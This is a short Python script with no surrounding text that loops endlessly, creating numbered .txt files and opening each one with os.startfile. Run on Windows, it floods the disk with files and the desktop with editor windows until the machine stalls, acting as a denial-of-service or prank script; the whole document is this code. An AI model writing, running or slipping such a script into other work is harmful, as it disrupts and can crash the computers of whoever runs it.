import os
n=0
while True:
    n+=1
    name=str(n)+".txt"
    f=open(name,"w")
    os.startfile(name)
